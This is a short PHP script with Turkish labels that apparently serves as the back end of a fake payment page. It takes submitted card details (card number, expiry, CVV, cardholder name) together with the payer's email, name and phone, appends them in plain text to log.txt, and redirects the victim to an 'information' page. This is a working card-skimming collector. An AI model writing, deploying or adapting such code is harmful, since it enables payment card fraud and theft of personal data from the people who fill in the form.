<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $tutar = $_POST["tutar"] ?? "Bilinmiyor";
    $mail = $_POST["mail"] ?? "Yok";
    $isim = $_POST["isim"] ?? "Yok";
    $telefon = $_POST["telefon"] ?? "Yok";
    $kart_isim = $_POST["kart_isim"] ?? "Yok";
    $kartno = $_POST["kartno"] ?? "Yok";
    $ay = $_POST["ay"] ?? "Yok";
    $yil = $_POST["yil"] ?? "Yok";
    $cvv = $_POST["cvv"] ?? "Yok";

    $veri = "--------- YENİ KAYIT ---------\n";
    $veri .= "Toplam Tutar: $tutar\n";
    $veri .= "Mail: $mail\n";
    $veri .= "İsim Soyisim: $isim\n";
    $veri .= "Telefon: $telefon\n";
    $veri .= "Kart Üzerindeki İsim: $kart_isim\n";
    $veri .= "Kart Numarası: $kartno\n";
    $veri .= "Son Kullanma: $ay/$yil\n";
    $veri .= "CVV: $cvv\n";
    $veri .= "------------------------------\n\n";

    header("Location: bilgilendirme.html");
    // log.txt dosyasına yaz
    file_put_contents("log.txt", $veri, FILE_APPEND);

    // Başarılı mesaj veya yönlendirme
    //echo "<h2>Bilgiler kaydedildi. Teşekkür ederiz.</h2>";
} else {
    echo "Form gönderilmedi.";
}
?>
